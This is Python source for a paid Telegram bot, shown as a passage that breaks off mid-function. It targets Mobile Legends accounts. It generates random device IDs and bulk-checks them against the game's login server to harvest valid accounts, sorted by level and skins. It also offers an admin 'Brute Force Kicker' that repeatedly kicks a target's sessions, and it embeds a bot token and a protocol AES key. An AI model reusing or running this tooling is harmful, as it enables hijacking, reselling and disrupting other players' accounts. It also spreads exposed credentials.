#!/usr/bin/env python3
# ===================================================================
# DEV ID Checker — Telegram Bot v5.2  ◈  SHIN CYBER EDITION
# -------------------------------------------------------------------
#   • REMOVED: Real Validator (all related code)
#   • ADDED:   Brute Force Kicker (admin-only, main-menu button)
#   • FIXED:   ban check queue desync between single + bulk
#   • FIXED:   ios_ device ID support (channel + auth payload)
#   • ADDED:   iOS UUID format support — ios_<UUID>
#   • FIXED:   fast /stop — interrupts in-flight socket reads
#   • Real Validator removed; Generator + guest rejection retained
#   • Watermark: @SHINRT771
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib, io
import struct, re, logging, asyncio, zipfile, shutil, hashlib, string
from enum import Enum
from typing import Tuple, Dict, Any, List, Optional
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor

import zstandard as zstd
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, InputFile
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import NetworkError
from telegram.request import HTTPXRequest

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────

BOT_TOKEN   = "8728762913:AAFdnTyiBUuhZiwGQ1FxgbgSb9Y_B1HovXY"
OWNER_ID    = 8621676055
BOT_NAME    = "DEV ID Checker Bot"
BOT_VERSION = "5.2"
BRAND       = "@SHINRT771"

REQUIRED_CHANNELS = [
    {"name": "Codm And Mlbb",   "url": "https://t.me/CodmAndMlbb",    "id": "@CodmAndMlbb"},
    {"name": "Etoshim",         "url": "https://t.me/etoshim",        "id": "@etoshim"},
    {"name": "Shin Discussion", "url": "https://t.me/ShinDisscussion", "id": "@ShinDisscussion"},
]

TELEGRAM_CONNECT_TIMEOUT = 60.0
TELEGRAM_READ_TIMEOUT    = 60.0
TELEGRAM_WRITE_TIMEOUT   = 60.0
TELEGRAM_POOL_TIMEOUT    = 60.0

MAX_THREADS_DEFAULT  = 30
MAX_THREADS_LIMIT    = 60
MIN_THREADS          = 1
MAX_GENERATE_COUNT   = 10000
MAX_VALIDATE_BULK    = 10000

SOCK_CONNECT_TIMEOUT = 5.0
SOCK_READ_TIMEOUT    = 3.0

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR  = os.path.join(BASE_DIR, "SHIN_DEVID_OUTPUT")
DATA_DIR    = os.path.join(BASE_DIR, "data")
RESULTS_DIR = os.path.join(BASE_DIR, "Results")

for d in (DATA_DIR, RESULTS_DIR, OUTPUT_DIR):
    os.makedirs(d, exist_ok=True)

USERS_FILE  = Path(DATA_DIR) / "users.json"
KEYS_FILE   = Path(DATA_DIR) / "keys.json"

# ────────────────────────────────────────────────────────────────
# MLBB PROTOCOL
# ────────────────────────────────────────────────────────────────

AES_KEY        = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.88.1205.1'
CHANNEL_AND    = 'and_usa'
CHANNEL_IOS    = 'ios_usa'
LANGUAGE       = 'en'

_STOP_SIGNAL = threading.Event()

# ────────────────────────────────────────────────────────────────
# HERO MAP
# ────────────────────────────────────────────────────────────────

HERO_ID_MAP: Dict[int, str] = {
    1:'Miya',2:'Balmond',3:'Saber',4:'Alice',5:'Nana',6:'Tigreal',7:'Alucard',8:'Karina',9:'Akai',10:'Franco',
    11:'Bane',12:'Bruno',13:'Clint',14:'Rafaela',15:'Eudora',16:'Zilong',17:'Fanny',18:'Layla',19:'Minotaur',20:'Lolita',
    21:'Hayabusa',22:'Freya',23:'Gord',24:'Natalia',25:'Kagura',26:'Chou',27:'Sun',28:'Alpha',29:'Ruby',30:'Yi Sun-shin',
    31:'Moskov',32:'Johnson',33:'Cyclops',34:'Estes',35:'Hilda',36:'Aurora',37:'Lapu-Lapu',38:'Vexana',39:'Roger',40:'Karrie',
    41:'Gatotkaca',42:'Harley',43:'Irithel',44:'Grock',45:'Argus',46:'Odette',47:'Lancelot',48:'Diggie',49:'Hylos',50:'Zhask',
    51:'Helcurt',52:'Pharsa',53:'Lesley',54:'Jawhead',55:'Angela',56:'Gusion',57:'Valir',58:'Martis',59:'Uranus',60:'Hanabi',
    61:"Chang'e",62:'Kaja',63:'Selena',64:'Aldous',65:'Claude',66:'Vale',67:'Leomord',68:'Lunox',69:'Hanzo',70:'Belerick',
    71:'Kimmy',72:'Thamuz',73:'Harith',74:'Minsitthar',75:'Kadita',76:'Faramis',77:'Badang',78:'Khufra',79:'Granger',80:'Guinevere',
    81:'Esmeralda',82:'Terizla',83:'X.Borg',84:'Ling',85:'Dyrroth',86:'Lylia',87:'Baxia',88:'Masha',89:'Wanwan',90:'Silvanna',
    91:'Cecilion',92:'Carmilla',93:'Atlas',94:'Popol and Kupa',95:'Yu Zhong',96:'Luo Yi',97:'Benedetta',98:'Khaleed',
    99:'Barats',100:'Brody',101:'Yve',102:'Mathilda',103:'Paquito',104:'Gloo',105:'Beatrix',106:'Phoveus',107:'Natan',108:'Aulus',
    109:'Aamon',110:'Valentina',111:'Edith',112:'Floryn',113:'Yin',114:'Melissa',115:'Xavier',116:'Julian',117:'Fredrinn',118:'Joy',
    119:'Novaria',120:'Arlott',121:'Ixia',122:'Nolan',123:'Cici',124:'Chip',125:'Zhuxin',126:'Suyou',127:'Lukas',128:'Kalea',
    129:'Zetian',130:'Obsidia'
}

def hero_name(hid) -> str:
    try: return HERO_ID_MAP.get(int(hid), f"Unknown({hid})")
    except (ValueError, TypeError): return f"Unknown({hid})"

def is_guest_account(acc) -> bool:
    if acc is None: return False
    s = str(acc).strip()
    return s.startswith("221") or s.startswith("222")

def is_banned_status(bs) -> bool:
    if bs is None: return False
    s = str(bs).strip().lower()
    if not s: return False
    if "not banned" in s: return False
    if s == "normal": return False
    if "unregistered" in s: return False
    if "guest" in s: return False
    if s.startswith("banned"): return True
    if s.startswith("suspended"): return True
    if s.startswith("restricted"): return True
    if "permanent ban" in s: return True
    if "temp ban" in s: return True
    return False

def detect_platform(device_id: str) -> str:
    if not device_id: return "and"
    s = str(device_id).strip().lower()
    return "ios" if s.startswith("ios_") else "and"

# ────────────────────────────────────────────────────────────────
# RANK
# ────────────────────────────────────────────────────────────────

RANK_DEFS = [
    (0,4,'Warrior III'),(5,9,'Warrior II'),(10,14,'Warrior I'),
    (15,19,'Elite IV'),(20,24,'Elite III'),(25,29,'Elite II'),(30,34,'Elite I'),
    (35,39,'Master IV'),(40,44,'Master III'),(45,49,'Master II'),(50,54,'Master I'),
    (55,59,'Grandmaster IV'),(60,64,'Grandmaster III'),(65,69,'Grandmaster II'),(70,74,'Grandmaster I'),
    (75,81,'Epic IV'),(82,88,'Epic III'),(89,95,'Epic II'),(96,107,'Epic I'),
    (108,114,'Legend IV'),(115,121,'Legend III'),(122,128,'Legend II'),(129,135,'Legend I'),
    (136,160,lambda p: f"Mythic {p-135}"),
    (161,195,lambda p: f"Mythical Honor {p-135}"),
    (196,235,lambda p: f"Mythical Glory {p-157}"),
    (236,9999,lambda p: f"Mythical Immortal {p-157}"),
]

def map_rank(p) -> str:
    try: p = int(p)
    except (ValueError, TypeError): return "Unranked"
    if p < 0: return "Unranked"
    for mn, mx, r in RANK_DEFS:
        if mn <= p <= mx: return r(p) if callable(r) else r
    return "Unranked"

def get_rank_category(rank_text: str) -> str:
    rt = rank_text.lower()
    if "warrior" in rt: return "warrior"
    if "elite" in rt: return "elite"
    if "grandmaster" in rt: return "gm"
    if "master" in rt and "grand" not in rt: return "master"
    if "epic" in rt: return "epic"
    if "legend" in rt: return "legend"
    if "mythic" in rt: return "mythic"
    return "other"

def map_collector_point(point) -> str:
    if not point or not isinstance(point, (int, float)): return "N/A"
    point = int(point)
    if point < 1000: return 'No Tier'
    tiers = [
        (1000, 4000, 'Amateur Collector'),(4000, 10000, 'Junior Collector'),
        (10000, 22000, 'Seasoned Collector'),(22000, 44000, 'Expert Collector'),
        (44000, 84000, 'Renowned Collector'),(84000, 160000, 'Exalted Collector'),
        (160000, 280000, 'Mega Collector'),(280000, float('inf'), 'World Collector'),
    ]
    for mn, mx, name in tiers:
        if mn <= point < mx:
            if name == 'World Collector': return 'World Collector'
            per_level = (mx - mn) / 5
            level = max(0, min(4, int((point - mn) // per_level)))
            return f"{name} {['V','IV','III','II','I'][level]}"
    return 'Unknown'

_BAN_CODES = {1:'Banned(perm)', 2:'Banned(temp)', 3:'Banned', 4:'Suspended', 5:'Restricted'}

def fmt_ts(ts) -> str:
    if not ts: return "N/A"
    try:
        return datetime.fromtimestamp(int(ts), tz=timezone.utc).astimezone(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S")
    except Exception: return "N/A"

# ────────────────────────────────────────────────────────────────
# GENERATOR + FORMAT VALIDATOR
# ────────────────────────────────────────────────────────────────

_HEX = "0123456789abcdef"
_ALNUM = "0123456789abcdefghijklmnopqrstuvwxyz"

_IOS_UUID_RE = re.compile(
    r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$'
)

def generate_device_id(platform: Optional[str] = None) -> str:
    if platform in (None, "mix"):
        platform = random.choice(["and", "ios"])
    platform = platform.lower()
    if platform not in ("and", "ios"):
        platform = random.choice(["and", "ios"])
    hex32 = ''.join(random.choices(_HEX, k=32))
    alnum24 = ''.join(random.choices(_ALNUM, k=24))
    uuid_str = str(uuid.uuid4())
    return f"{platform}_{hex32}{alnum24}-{uuid_str}"

def validate_device_format(did: str) -> Tuple[bool, str]:
    if not isinstance(did, str): return False, "Not a string"
    did = did.strip()
    if not did: return False, "Empty"
    if not did.startswith(("and_", "ios_")): return False, "Missing and_/ios_ prefix"
    body = did[4:]

    if did.lower().startswith("ios_") and _IOS_UUID_RE.match(body):
        return True, "Format OK (iOS UUID)"

    if len(body) < 60: return False, f"Body too short ({len(body)})"
    if len(body) > 120: return False, f"Body too long ({len(body)})"
    if not re.match(r'^[0-9a-f]{32}', body): return False, "Missing 32-char hex prefix"
    if "-" not in body: return False, "Missing UUID separator"
    rest = body[32:]
    if not re.match(r'^[0-9a-zA-Z\-]+$', rest): return False, "Invalid chars in body"
    if not re.search(r'[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', body):
        return False, "Malformed UUID suffix"
    return True, "Format OK"

def parse_device_id(device_id: str) -> Dict[str, Any]:
    raw = (device_id or "").strip()
    platform = detect_platform(raw)
    body = raw[4:] if raw[:4].lower() in ("and_", "ios_") else raw

    if platform == "ios" and _IOS_UUID_RE.match(body):
        uuid_str = body
        return {
            "platform": "ios",
            "imei":     uuid_str,
            "android":  uuid_str,
            "adid":     uuid_str,
            "channel":  CHANNEL_IOS,
            "auth_str": f'idfa={uuid_str}&idfv={uuid_str}&device_unique_id={uuid_str}',
        }

    imei    = body[:32] if len(body) >= 32 else body
    android = body[32:48] if len(body) >= 48 else ""
    adid    = body[48:] if len(body) > 48 else ""

    if platform == "ios":
        return {
            "platform": "ios",
            "imei":     imei,
            "android":  android,
            "adid":     adid,
            "channel":  CHANNEL_IOS,
            "auth_str": f'idfa={adid}&idfv={android}&device_unique_id={imei}',
        }
    return {
        "platform": "and",
        "imei":     imei,
        "android":  android,
        "adid":     adid,
        "channel":  CHANNEL_AND,
        "auth_str": f'gps_adid={adid}&android_id={android}&device_unique_id={imei}',
    }

def _mask_uuid(s: str, head: int = 8, tail: int = 4) -> str:
    if not s: return ""
    s = str(s)
    if len(s) <= head + tail: return s
    return f"{s[:head]}…{s[-tail:]}"

# ────────────────────────────────────────────────────────────────
# LOGGING
# ────────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)-7s | %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
log = logging.getLogger("shinbot")

# ════════════════════════════════════════════════════════════════
# DESIGN LAYER
# ════════════════════════════════════════════════════════════════

LINE_HEAVY = "━" * 28
LINE_THIN  = "─" * 28
LINE_DOT   = "┈" * 28

def banner_line() -> str:
    return f"◇  *D E V  I D  C H E C K E R*  ◇\n_{LINE_DOT}_\n`⚡ CYBER SCANNER ⚡  v{BOT_VERSION}`\n`⟐  Device ID Toolkit  ⟐`"

def panel_title(title: str) -> str:
    return f"◇  *{title.upper()}*  ◇\n{LINE_HEAVY}"

def _bar(pct: float, width: int = 20) -> str:
    pct = max(0.0, min(100.0, pct))
    f = int(width * pct / 100)
    return "█" * f + "░" * (width - f)

def _fmt_secs(s) -> str:
    s = int(max(0, s))
    if s < 60: return f"{s}s"
    m, s = divmod(s, 60)
    if m < 60: return f"{m}m{s}s"
    h, m = divmod(m, 60); return f"{h}h{m}m"

def _stat(icon, label, value, last=False):
    return f"{'┗' if last else '┣'} {icon}  {label:<11}: `{value}`"

LEVEL_BRACKETS = [
    (9,   30,  "level_9-30.txt",   "lv_9_30"),
    (31,  50,  "level_31-50.txt",  "lv_31_50"),
    (51,  100, "level_51-100.txt", "lv_51_100"),
    (101, 200, "level_101-200.txt","lv_101_200"),
    (201, 9999,"level_200plus.txt","lv_200_plus"),
]
SKIN_BRACKETS = [
    (20,  50,  "skin_20-50.txt",     "sk_20_50"),
    (51,  100, "skin_51-100.txt",    "sk_51_100"),
    (101, 200, "skin_101-200.txt",   "sk_101_200"),
    (201, 300, "skin_201-300.txt",   "sk_201_300"),
    (301, 400, "skin_301-400.txt",   "sk_301_400"),
    (401, 9999,"skin_401-700plus.txt","sk_401_plus"),
]

def _esc(s): return str(s).replace("`", "'").replace("*", "").replace("_", " ")

def line_success(did, pd):
    sid = did[-8:] if len(did) >= 8 else did
    lvl = pd.get("level", "?"); sk = pd.get("skin_count", "?")
    rank = str(pd.get("current_rank", "?"))[:14]
    ban = str(pd.get("ban_status", ""))
    base = (f"✅  `…{sid}`  ┃  *{_esc(str(pd.get('nickname','?'))[:20])}*"
            f"  ┃  `Lv:{lvl}`  ┃  `🆔{pd.get('account_id','?')}`"
            f"  ┃  `🌐{pd.get('zone_id','?')}`  ┃  `🎨{sk}`  ┃  `🏆{rank}`")
    if is_banned_status(ban):
        base += f"  ⚠️ `{ban[:18]}`"
    return base

def line_error(did, err):
    sid = did[-8:] if len(did) >= 8 else did
    return f"❌  `…{sid}`  ┃  _{_esc(err[:60])}_"

def render_card(did, pd):
    acc   = pd.get("account_id", "?"); zone  = pd.get("zone_id", "?")
    nick  = pd.get("nickname", "N/A"); level = pd.get("level", "N/A")
    skins = pd.get("skin_count", "N/A"); heroes= pd.get("hero_count", "N/A")
    cur   = pd.get("current_rank", "Unranked"); high  = pd.get("highest_rank", "N/A")
    coll  = pd.get("collector_tier", "N/A"); cpt   = pd.get("collector_point")
    cpt_s = f"{int(cpt):,}" if isinstance(cpt, (int, float)) and cpt > 0 else "N/A"
    loc   = pd.get("location") or "NOT FOUND"; ll    = pd.get("last_login") or "N/A"
    squad = pd.get("squad") or "N/A"; wr    = pd.get("win_rate", "N/A")
    ban   = pd.get("ban_status", "Not Banned"); v2l   = pd.get("v2l_status", "N/A")
    hh    = pd.get("hero_history") or []
    hh_s  = ", ".join(str(x) for x in hh[:5]) if hh else "N/A"
    found = datetime.now(TZ_WIB).strftime("%Y-%m-%d %H:%M:%S")
    return (
        "```\n"
        "╔══════════════════════════════════════════════════╗\n"
        "║   ◇  DEVICE ID CHECK RESULT  ◇                   ║\n"
        "╚══════════════════════════════════════════════════╝\n"
        "```\n"
        f"{panel_title('Identity')}\n"
        f"┣ 🆔 Device : `{did}`\n┣ 🎮 Acc    : `{acc}`\n┣ 🌐 Zone   : `{zone}`\n"
        f"┣ 🏷 Nick   : *{_esc(nick)}*\n┣ 📈 Level  : `{level}`\n"
        f"┣ 🦸 Heroes : `{heroes}`\n┗ 🎨 Skins  : `{skins}`\n"
        f"\n{panel_title('Ranks')}\n"
        f"┣ 🏆 Current: `{cur}`\n┣ ⭐ High   : `{high}`\n"
        f"┣ 💠 Collector: `{coll}`\n┗ 💎 Points : `{cpt_s}`\n"
        f"\n{panel_title('Account')}\n"
        f"┣ 🚫 Ban    : `{ban}`\n┣ 🧪 V2L    : `{v2l}`\n"
        f"┣ 📍 Loc    : `{loc}`\n┣ ⏰ Login  : `{ll}`\n"
        f"┣ 👥 Squad  : `{squad}`\n┣ 🎯 WR     : `{wr}`\n"
        f"┗ 🦸 Recent : `{hh_s}`\n"
        f"\n{LINE_DOT}\n🕒 Found : `{found}`\n👑 {BRAND}"
    )

def render_live(snap, status="RUNNING"):
    total = max(snap["total"], 1); checked = snap["checked"]
    pct = checked / total * 100; elapsed = snap["elapsed"]
    cpm = int(checked / max(elapsed, 0.001) * 60)
    spd = snap.get("live_rate", checked / max(elapsed, 0.001))
    rem = max(total - checked, 0); eta = snap.get("eta", 0)
    icon = {"RUNNING":"⚡","STOPPING":"🛑","FINISHED":"✅"}.get(status, "⚡")
    return (
        f"{icon}  *LIVE SCAN MONITOR*\n{LINE_HEAVY}\n"
        f"`{_bar(pct, 22)}` *{pct:5.1f}%*\n\n"
        f"{panel_title('Progress')}\n"
        f"{_stat('⏳','Checked', checked)}\n{_stat('⏹','Remain',  rem)}\n"
        f"{_stat('📁','Total',   total)}\n{_stat('⏱','Elapsed', _fmt_secs(elapsed), last=True)}\n"
        f"\n{panel_title('Results')}\n"
        f"{_stat('✅','Valid',   snap['hits'])}\n{_stat('🚫','Banned',  snap['banned'])}\n"
        f"{_stat('❌','Invalid', snap['failed'], last=True)}\n"
        f"\n{panel_title('Speed')}\n┣ ⚡ Rate : `{spd:.1f}/s`\n┣ 🔥 CPM  : `{cpm}`\n┗ ⏳ ETA  : `{_fmt_secs(eta)}`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_summary(snap, elapsed, sdir):
    total = snap["total"]; hits = snap["hits"]; banned = snap["banned"]
    failed = snap["failed"]; spd = total / max(elapsed, 0.001)
    lv = snap.get("lv", {}); sk = snap.get("sk", {})
    lv_rows = "\n".join(f"┣ 📈 {a}-{b}  : `{lv.get(key,0)}`" for a, b, _, key in LEVEL_BRACKETS[:-1])
    lv_last = f"┗ 📈 {LEVEL_BRACKETS[-1][0]}+    : `{lv.get(LEVEL_BRACKETS[-1][3],0)}`"
    sk_rows = "\n".join(f"┣ 🎨 {a}-{b}  : `{sk.get(key,0)}`" for a, b, _, key in SKIN_BRACKETS[:-1])
    sk_last = f"┗ 🎨 {SKIN_BRACKETS[-1][0]}+    : `{sk.get(SKIN_BRACKETS[-1][3],0)}`"
    folder = os.path.basename(sdir)
    return (
        f"✅  *SCAN COMPLETE*\n{LINE_HEAVY}\n\n{panel_title('Metrics')}\n"
        f"{_stat('✅','Valid',   hits)}\n{_stat('🚫','Banned',  banned)}\n"
        f"{_stat('❌','Invalid', failed)}\n{_stat('📁','Total',   total)}\n"
        f"{_stat('⏱','Time',   _fmt_secs(elapsed))}\n{_stat('⚡','Speed',  f'{spd:.1f}/s', last=True)}\n"
        f"\n{panel_title('Level Distribution')}\n{lv_rows}\n{lv_last}\n"
        f"\n{panel_title('Skin Distribution')}\n{sk_rows}\n{sk_last}\n"
        f"\n{panel_title('Output')}\n"
        f"┣ 📂 Folder : `{folder}/`\n┣ 📄 all_valid.txt\n┣ 📂 levels/\n┣ 📂 skins/\n┗ 📄 summary.txt\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_welcome(name, is_admin, expiry, checked, hits):
    role = "👑  Admin — unlimited access" if is_admin else f"🎟️  Access until: `{expiry}`"
    tools = (
        "┣ 🔥 Bulk Check → send `.txt` of IDs\n"
        "┣ 🔍 Single Check → send one ID\n"
        "┣ ⚡ Brute Force → kick sessions (admin)\n"
        "┣ 🎲 Generate → create random IDs\n"
        "┗ 📊 Stats → hit counters\n"
        if is_admin else
        "┣ 🔥 Bulk Check → send `.txt` of IDs\n"
        "┣ 🔍 Single Check → send one ID\n"
        "┣ 🎲 Generate → create random IDs\n"
        "┗ 📊 Stats → hit counters\n"
    )
    return (
        f"{banner_line()}\n{LINE_HEAVY}\nWelcome, *{_esc(name)}*!\n\n{role}\n\n"
        f"{panel_title('Your Stats')}\n"
        f"{_stat('🔍','Checked', checked)}\n{_stat('🎯','Hits',    hits, last=True)}\n\n"
        f"{panel_title('How to use')}\n"
        f"{tools}\n"
        f"{panel_title('Required Channels')}\n"
        + "\n".join(f"┣ 📢 [{c['name']}]({c['url']})" for c in REQUIRED_CHANNELS[:-1])
        + f"\n┗ 📢 [{REQUIRED_CHANNELS[-1]['name']}]({REQUIRED_CHANNELS[-1]['url']})\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_no_key():
    return (
        f"{banner_line()}\n{LINE_HEAVY}\n🔒  *ACCESS RESTRICTED*\n\n"
        "This tool requires an access key.\n\n"
        f"{panel_title('Pricing')}\n"
        "┣ 💳 3 Days    · ₱50\n┣ 💳 7 Days    · ₱70\n"
        "┣ 💳 1 Month   · ₱100\n┗ 💳 Lifetime  · ₱250\n\n"
        f"📩 Contact admin: {BRAND}\n`/redeem <key>` to activate\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_menu(is_admin=False):
    tools = (
        "┣ 🔥 Bulk Check — `.txt` of device IDs\n"
        "┣ 🔍 Single Check — one device ID\n"
        "┣ ⚡ Brute Force — kick target sessions *(admin)*\n"
        "┣ 🎲 Generate IDs — random `and_`/`ios_`\n"
        "┣ 📊 Statistics — rank counters\n"
        "┣ 💳 Buy Access Key\n┗ 📖 Help\n"
        if is_admin else
        "┣ 🔥 Bulk Check — `.txt` of device IDs\n"
        "┣ 🔍 Single Check — one device ID\n"
        "┣ 🎲 Generate IDs — random `and_`/`ios_`\n"
        "┣ 📊 Statistics — rank counters\n"
        "┣ 💳 Buy Access Key\n┗ 📖 Help\n"
    )
    return f"{banner_line()}\n{LINE_HEAVY}\n{panel_title('Menu')}\n{tools}{LINE_HEAVY}\n👑 {BRAND}"

def render_generate_menu(platform="mix"):
    icon = {"and":"🤖","ios":"🍎","mix":"🎲"}.get(platform, "🎲")
    return (
        f"{banner_line()}\n{LINE_HEAVY}\n"
        f"◇  *DEVICE ID GENERATOR*  ◇\n{LINE_HEAVY}\n"
        f"┣ {icon} Platform : `{platform.upper()}`\n"
        f"┣ 🔢 Range    : `1 - {MAX_GENERATE_COUNT:,}`\n"
        f"┗ 🎯 Output   : unique IDs, no duplicates\n"
        f"{LINE_HEAVY}\n_Pick platform, then send the count._\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_bf_menu():
    return (
        f"{banner_line()}\n{LINE_HEAVY}\n"
        f"◇  *BRUTE FORCE KICKER*  ◇\n{LINE_HEAVY}\n"
        f"┣ 🎯 Target  : one device ID\n"
        f"┣ 🔍 Verify  : fetch session profile\n"
        f"┣ ⚡ Modes   : 1x / 10x / 50x / 100x / ∞\n"
        f"┣ 🛑 Stop    : anytime via button or /stop\n"
        f"┣ 🍎 iOS     : supported\n"
        f"┗ 👑 Access  : admin only\n"
        f"{LINE_HEAVY}\n"
        f"_Send a device ID to begin verification._\n"
        f"{LINE_HEAVY}\n👑 {BRAND}"
    )

def render_bf_profile(profile):
    return (
        f"✅  *DEVICE VERIFIED*\n{LINE_HEAVY}\n\n"
        f"{panel_title('Target')}\n"
        f"┣ 👤 Nick    : `{_esc(profile['nickname'])}`\n"
        f"┣ 🆔 Acc     : `{profile['account_id']}`\n"
        f"┣ 🌐 Zone    : `{profile['zone_id']}`\n"
        f"┣ 🏆 Rank    : `{profile['rank']}`\n"
        f"┣ 🎨 Skins   : `{profile['skin_count']}`\n"
        f"┣ 🦸 Heroes  : `{profile['hero_count']}`\n"
        f"┣ 🖥 Server  : `{profile['gs_info']}`\n"
        f"┗ 🚫 Ban     : `{profile['ban_status']}`\n\n"
        f"_{LINE_DOT}_\n"
        f"Select a kick mode below:\n"
        f"👑 {BRAND}"
    )

def render_generate_result(count, ids, platform, preview=8):
    icon = {"and":"🤖","ios":"🍎","mix":"🎲"}.get(platform, "🎲")
    lines = [
        f"✅  *GENERATED {count} ID(S)*", LINE_HEAVY,
        f"┣ {icon} Platform : `{platform.upper()}`",
        f"┗ 📄 Total    : `{count}`", LINE_HEAVY, "",
    ]
    for i, did in enumerate(ids[:preview]):
        lines.append(f"`{i+1}.` `{did}`"); lines.append("")
    if len(ids) > preview:
        lines.append(f"_… and {len(ids) - preview} more in attached file_")
    lines.append(LINE_HEAVY); lines.append(f"👑 {BRAND}")
    return "\n".join(lines)

def kb_generate_platform():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🤖  Android (and_)", callback_data="gen_set:and"),
         InlineKeyboardButton("🍎  iOS (ios_)",     callback_data="gen_set:ios")],
        [InlineKeyboardButton("🎲  Mixed",          callback_data="gen_set:mix")],
        [InlineKeyboardButton("⬅️  Back", callback_data="gen_back")],
    ])

def kb_bf_modes():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🧪 1x Test",          callback_data="bf_run:1:0")],
        [InlineKeyboardButton("⚡ 10x (2s delay)",   callback_data="bf_run:10:2")],
        [InlineKeyboardButton("🚀 50x (1s delay)",   callback_data="bf_run:50:1")],
        [InlineKeyboardButton("💥 100x (0.5s)",      callback_data="bf_run:100:0.5")],
        [InlineKeyboardButton("♾ Unlimited",        callback_data="bf_run:0:0")],
        [InlineKeyboardButton("❌ Cancel",           callback_data="bf_cancel")],
    ])

# ════════════════════════════════════════════════════════════════
# MEMBERSHIP GATE
# ════════════════════════════════════════════════════════════════

_membership_cache = {}; _membership_lock = threading.Lock(); _MEMBERSHIP_TTL = 60.0

async def check_membership(bot, user_id):
    if user_id == OWNER_ID: return True, []
    now = time.time()
    with _membership_lock:
        cached = _membership_cache.get(user_id)
        if cached and (now - cached[0]) < _MEMBERSHIP_TTL:
            return cached[1], cached[2]
    missing = []
    for ch in REQUIRED_CHANNELS:
        try:
            m = await bot.get_chat_member(chat_id=ch["id"], user_id=user_id)
            if m.status in ("left","kicked"): missing.append(ch["name"])
        except Exception as e:
            log.warning(f"Membership check failed for {ch['id']}: {e}")
    ok = (len(missing) == 0)
    with _membership_lock: _membership_cache[user_id] = (now, ok, missing)
    return ok, missing

def invalidate_membership(user_id):
    with _membership_lock: _membership_cache.pop(user_id, None)

def kb_join_channels():
    rows = [[InlineKeyboardButton(f"📢  Join  {ch['name']}", url=ch["url"])] for ch in REQUIRED_CHANNELS]
    rows.append([InlineKeyboardButton("✅  I've Joined — Verify", callback_data="verify_join")])
    return InlineKeyboardMarkup(rows)

def render_join_gate(first_name="there"):
    lines = ["◇  *CHANNEL VERIFICATION REQUIRED*  ◇", LINE_HEAVY, "",
             f"Hey *{_esc(first_name)}*, join all three channels to unlock the bot:", ""]
    for ch in REQUIRED_CHANNELS: lines.append(f"  📢  [{ch['name']}]({ch['url']})")
    lines += ["", LINE_HEAVY, "After joining, tap *✅ I've Joined — Verify*", "", f"👑 {BRAND}"]
    return "\n".join(lines)

async def gate(update, ctx):
    user = update.effective_user
    if user.id == OWNER_ID: return True
    ok, _ = await check_membership(ctx.bot, user.id)
    if ok: return True
    text = render_join_gate(user.first_name or "there"); kb = kb_join_channels()
    if update.callback_query:
        try: await update.callback_query.edit_message_text(text, parse_mode="Markdown", reply_markup=kb)
        except Exception:
            await ctx.bot.send_message(chat_id=user.id, text=text, parse_mode="Markdown", reply_markup=kb)
    else:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
    return False

# ════════════════════════════════════════════════════════════════
# SDP
# ════════════════════════════════════════════════════════════════

class SdpDataType(Enum):
    INTEGER_POSITIVE=0; INTEGER_NEGATIVE=1; FLOAT=2; DOUBLE=3
    STRING=4; LIST=5; DICT=6; STRUCT_BEGIN=7; STRUCT_END=8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__(); self.data = b''; self.offset = 0
        if isinstance(data, bytes): self.data = data; self._unpack()
        elif data is not None: self.update(data); self._pack()
    def _pack(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()): self._pack_item(k, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])
    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value: self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_item()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
            self[k] = v
    def _wv(self, n):
        res = bytearray()
        while n >= 0x80: res.append((n & 0x7F) | 0x80); n >>= 7
        res.append(n & 0x7F); return bytes(res)
    def _rv(self):
        n = 1; val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n); n += 1
        self.offset += n; return val
    def _ph(self, tag, dt):
        if tag < 15: self.data += bytes([(dt.value << 4) | tag])
        else: self.data += bytes([(dt.value << 4) | 15]) + self._wv(tag)
    def _pack_item(self, tag, val):
        if isinstance(val, bool):
            self._ph(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._wv(1 if val else 0)
        elif isinstance(val, int):
            if val < 0: self._ph(tag, SdpDataType.INTEGER_NEGATIVE); self.data += self._wv(-val)
            else: self._ph(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._wv(val)
        elif isinstance(val, float):
            self._ph(tag, SdpDataType.DOUBLE); self.data += self._wv(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            self._ph(tag, SdpDataType.STRING)
